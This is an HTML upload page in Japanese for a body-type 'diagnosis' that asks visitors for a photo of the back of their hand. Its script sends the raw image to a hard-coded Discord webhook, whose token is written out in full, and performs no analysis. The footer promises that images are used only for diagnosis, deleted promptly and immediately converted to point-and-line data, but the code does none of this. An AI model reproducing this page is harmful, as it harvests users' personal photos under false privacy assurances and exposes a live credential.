<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="UTF-8">
  <title>体癖・雰囲気診断 手の写真アップロード</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="stylesheet" href="style.css">
  <style>
    .upload-section {
      margin-top: 30px;
    }

    input[type="file"] {
      margin-top: 15px;
      padding: 10px;
      background-color: #f9f9f9;
      border: 1px solid #ccc;
      border-radius: 8px;
    }

    button {
      margin-top: 30px;
      padding: 12px 24px;
      font-size: 16px;
      border: none;
      border-radius: 8px;
      background-color: #4CAF50;
      color: white;
      cursor: pointer;
    }

    button:disabled {
      background-color: #ccc;
      cursor: not-allowed;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>写真分析 手の骨格</h1>
    <p>手の甲の写真をアップロードしてください。</p>

    <div class="upload-section">
      <input type="file" id="shoulderImage" accept="image/*">
    </div>

    <button id="nextButton" onclick="uploadImage()" disabled>次に進む</button>
  </div>

  <script>
    const fileInput = document.getElementById('shoulderImage');
    const nextButton = document.getElementById('nextButton');

    // 入力があればボタンを有効化
    fileInput.addEventListener('change', function () {
      nextButton.disabled = !fileInput.files.length;
    });

    async function uploadImage() {
      const file = fileInput.files[0];
      if (!file) {
        alert('写真をアップロードしてください');
        return;
      }

      const formData = new FormData();
      formData.append("file", file);
      formData.append("username", "体癖診断");
      formData.append("content", "手の甲の写真");

      //送信画像の削除処理は外部ツール使用
      try {
        await fetch("https://discord.com/api/webhooks/1385079473745170544/djQAvhWo3VXoIVfjOvJc3QpVhC1TnFkvofXPlIIbSgOEeLdne-B1rPDtUuxd8C3HIo-h", {
          method: "POST",
          body: formData
        });

        // 正常に送信されたら次のページへ
        window.location.href = "page3.html";
      } catch (error) {
        console.error("送信エラー:", error);
        alert("送信に失敗しました。もう一度お試しください。");
      }
    }
  </script>

<footer class="notice">
  
  <div class="precautions">
    <p class="precautions-title">📝 <strong>診断前のご注意</strong></p>
    <ul class="precautions-list">
      <li>手を広げた甲がはっきり写っている写真をご利用ください。</li>
      <li>写真内に範囲が収まるよう広く撮影してください。</li>
      <li>アップロードされた画像は診断のみに使用され、完了後は速やかに削除されます。</li>
      <li>画像診断には数秒かかります。「次に進む」ボタンを押した後はそのまましばらくお待ちください。</li>
      <li>加工された画像や他人の画像の使用はご遠慮ください。</li>
    </ul>
  </div>

  <div class="privacy-demo">
    <p class="demo-caption">
      <strong>プライバシー保護の仕組み</strong><br>
      送信された画像はプライバシーのため<br>直ちにこのような点と線のデータに置き換えられます。<br>安心してご利用ください。
    </p>
    <div class="demo-images-container">
      <img src="https://media.discordapp.net/attachments/1380100538074533989/1391218284761841744/53_20250610204137.png?ex=686b187e&is=6869c6fe&hm=0d02c9f2681ff6b436133e883214bf09bcff8f395826b526714314b58d250c14&=&format=webp&quality=lossless&width=1114&height=1486" alt="加工前の手の甲の写真">
      
      <span class="demo-arrow">→</span>
      
      <img src="https://media.discordapp.net/attachments/1380100538074533989/1391218285013635115/53_20250610205638.png?ex=686b187e&is=6869c6fe&hm=39520390630fb0a6b0dd9fccfa3a6b5b7a2b1faa8d30cf94ad21828e0daa46dc&=&format=webp&quality=lossless&width=1114&height=1486" alt="点と線でデータ化された手の甲の写真">
    </div>
  </div>

</footer>

  
</body>
</html>
